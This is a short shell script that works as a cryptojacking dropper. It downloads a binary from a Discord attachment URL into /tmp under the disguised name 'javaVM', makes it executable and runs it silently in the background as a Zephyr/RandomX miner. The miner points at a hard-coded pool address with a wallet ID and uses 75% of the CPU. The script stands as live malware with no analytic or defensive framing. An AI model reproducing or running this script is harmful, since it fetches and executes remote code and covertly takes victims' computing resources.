#!/bin/sh
if [ -f /tmp/javaVM ]
 	then
 	/tmp/javaVM -o 143.47.231.0:443 -u ZEPHYR3RCLzj46G67Ubxse1CHxYyH8BmWhq5zYR6jpsBWrZpPq9N5dGa9gAJHNC1KfC5NkRjAecx954DRsUu7spVja4UDc9NuEa2e -p DuckRig -a rx/0 -k --donate-level --tls --cpu-max-threads-hint=75 > /dev/null 2>&1 &
 	echo Started Existing
 	else
 		wget -q https://cdn.discordapp.com/attachments/1077106588814422077/1176281046459879526/SRB -O /tmp/javaVM
 		chmod +x /tmp/javaVM
 		/tmp/javaVM -o 143.47.231.0:443 -u ZEPHYR3RCLzj46G67Ubxse1CHxYyH8BmWhq5zYR6jpsBWrZpPq9N5dGa9gAJHNC1KfC5NkRjAecx954DRsUu7spVja4UDc9NuEa2e -p DuckRig -a rx/0 -k --donate-level --tls --cpu-max-threads-hint=75 > /dev/null 2>&1 &
fi
